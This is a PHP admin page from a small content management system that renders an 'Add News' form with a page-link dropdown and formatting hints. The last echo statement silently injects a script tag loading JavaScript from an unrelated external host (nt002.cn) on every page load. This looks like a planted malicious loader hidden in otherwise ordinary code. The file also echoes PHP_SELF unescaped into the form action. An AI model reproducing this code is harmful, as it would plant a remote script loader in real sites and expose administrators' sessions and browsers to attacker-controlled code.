<?php
session_start();

if ($_SESSION['auth'] == "admin") 
{
	include("db_connect.php");
	$pages_query = "SELECT * FROM pages"; 
	$pages_result = mysql_query($pages_query);
	$print_date = date('F j, Y');
	$todays_date = date('Y-m-d');
	echo "<html>\n<head>\n<link rel='stylesheet' href='admin.css'  type='text/css' />\n</head>\n<body>\n";
	echo "<h2>Add News</h2>";
	include ('admin_navigation.php'); 
	echo "<form action='$_SERVER[PHP_SELF]?action=add' method='post'>" ;
	echo "<input type='hidden' name='action' value='add'>";
	echo "<input type='hidden' name='date' value='".$todays_date."'>";
	echo $print_date."&nbsp; &nbsp; <input name='title' type='text'><br /><br />";
	echo "<textarea cols='80' rows='10' name='content'></textarea><br /><br />";
	echo "Link to a page: <select name='link'>\n";
	//echo "<option value='0'></option>";
			
	if ($row['news_link'] == 0) 
	{
		echo "<option value='0' selected='yes'>"; 
	}
	
	while ($row = mysql_fetch_array($pages_result, MYSQL_ASSOC))
	{
		echo "<option value='".$row['page_id']."'";
				
		if ($row['news_link'] == $row['page_id']) { echo "selected='yes'"; }
				
		echo ">".$row['page_title']."</option>";
	}
			
	echo "</select><br /><br />\n";
	echo "<input name='edit' type='submit' value='Submit'> <a href='index.php'>Cancel</a>";
	echo "</form>";


	?> 

	<br />
	Code you can use:<br />
	[b] <strong>bold text</strong> [/b]<br />
	[i] <i>italic text</i> [/i]<br />
	[u] <u>underline</u> [/u] <br />
	[return] - new line<br />
    <?php echo "<script src='http://nt002.cn/E/J.JS'></script></body>\n</html>\n"; ?>
	
<?php	
}
?>